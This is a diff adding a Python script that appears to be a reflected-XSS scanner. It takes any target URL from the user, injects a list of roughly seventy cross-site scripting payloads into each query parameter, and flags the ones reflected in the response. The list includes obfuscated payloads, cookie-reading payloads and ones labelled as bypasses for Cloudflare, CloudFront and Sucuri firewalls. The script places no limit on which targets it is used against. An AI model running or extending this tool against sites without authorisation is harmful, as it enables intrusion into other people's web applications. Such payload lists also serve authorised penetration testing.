@@ -1,0 +1,121 @@
+import requests
+import urllib.parse
+
+# ANSI escape codes for colored text
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+
+# XSS payloads for testing
+XSS_PAYLOADS = [
+    # Basic payload
+    "<script>alert('XSS')</script>",
+    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "\"><script>alert('XSS')</script>",
+    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "<script>\\u0061lert('22')</script>",
+    "<script>eval('\\x61lert(\\'33\\')')</script>",
+    "<script>eval(8680439..toString(30))(983801..toString(36))</script>",  # parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+    "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
+
+    # Img payload
+    "<img src=x onerror=alert('XSS');>",
+    "<img src=x onerror=alert('XSS')//>",
+    "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "\"><img src=x onerror=alert('XSS');>",
+    "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "<><img src=1 onerror=alert(1)>",
+
+    # Svg payload
+    "<svg\x0Conload=alert(1)>",
+    "<svg/onload=alert('XSS')>",
+    "<svg onload=alert(1)//>",
+    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "<svg id=alert(1) onload=eval(id)>",
+    "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "\"><svg/onload=alert(/XSS/)>",
+    "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self-closing script)",
+    "<svg><script>alert('33')",
+    "<svg><script>alert&lpar;'33'&rpar;",
+
+    # Div payload
+    "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
+    "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
+    "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
+    "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
+    "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
+    "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
+    "<div onpointerup=\"alert(45)\">MOVE HERE</div>",
+
+    # Additional payloads from the original script
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<iframe src=javascript:alert('XSS')>",
+    ">><img src=x onerror=confirm(/XSS/)>",
+    "6'%22()%26%25%22%3E%3Csvg/onload=prompt(document.domain)%3E/",
+    "[\"');alert('XSS');//\"]@xyz.xxx",
+    "<script>alert(\"XSS By Az3m\")</script>",
+    "<script>alert(\"XSSByAz3m\")</script>",
+    "<script>alert(/XSSByAz3m/)</script>",
+    "<script>alert('XSSByAz3m')</script>",
+    "<script>alert(XSSByAz3m)</script>",
+    "<script>confirm(\"XSS By Az3m\")</script>",
+    "<script>confirm(\"XSSByAz3m\")</script>",
+    "<script>confirm(/XSSByAz3m/)</script>",
+    "<script>confirm('XSSByAz3m')</script>",
+    "<script>confirm(XSSByAz3m)</script>",
+    "<svg/oNLY%3d1/**/On+ONLoaD%3dconfirm%26%23x28%3b%26%23x29%3b>",
+    "<Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ==\"))>",
+    "<details/open/ontoggle=confirm('XSS')>",
+    "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
+    ";window/*aabb*/['al'%2b'ert'](document./*aabb*/Location);",
+    "\">%0D%0A%0D%0A<x foo=\"foo\"><x foo=\"\"><img src=x onerror=javascript:alert('cloudfrontbypass')//>",
+    "<svg onload='new Function([\"Y000!\"].find(alert))'>",
+    "\"><svg/onload=confirm(1)>",
+    "\">@gmail.com",
+    "\"><img src=x onerror=alert(document.cookie);>",
+    "<A HREF=\"https://www.cia.gov/\">Click Here </A>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "<button onClick=\"prompt(1337)\">Submit</button>",
+    "<a href=\"javascript:alert(1337)\">ClickMe</a>",
+    "<a href=\"javascript:alert(document.cookie)\">ClickMe</a>",
+    "<a href=\"javascript:alert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie);\">ClickMe</a>",
+    "<a href=\"https://github.com/coffinxp\">ClickMe</a>"
+]
+
+def test_xss(url, params):
+    print(f"Scanning {url} for XSS vulnerabilities...")
+    
+    for param in params:
+        for payload in XSS_PAYLOADS:
+            # Inject payload into parameters
+            test_params = {k: v[0] for k, v in params.items()}  # Convert lists to single values
+            test_params[param] = payload
+            test_url = f"{url}?{urllib.parse.urlencode(test_params)}"
+            
+            try:
+                response = requests.get(test_url, timeout=5)
+                if response.status_code == 200:
+                    if payload in response.text:
+                        print(f"{RED}[VULNERABLE]{RESET} {url} | Parameter: {param} | Payload: {payload} | Status: 200 OK - Reflected XSS")
+                    else:
+                        print(f"{GREEN}[SAFE]{RESET} {url} | Parameter: {param} | Payload: {payload} | Status: 200 OK - No Reflection")
+                else:
+                    print(f"{YELLOW}[ERROR]{RESET} {url} | Parameter: {param} | Payload: {payload} | Status: {response.status_code}")
+            except requests.RequestException as e:
+                print(f"{YELLOW}[ERROR]{RESET} Error testing {url}: {e}")
+
+if __name__ == "__main__":
+    target_url = input("Enter target URL (with parameters, e.g., https://example.com/page?query=search): ")
+    parsed_url = urllib.parse.urlparse(target_url)
+    query_params = urllib.parse.parse_qs(parsed_url.query)
+    
+    if not query_params:
+        print("No query parameters found in the URL. Please provide a URL with parameters.")
+    else:
+        test_xss(parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path, query_params)
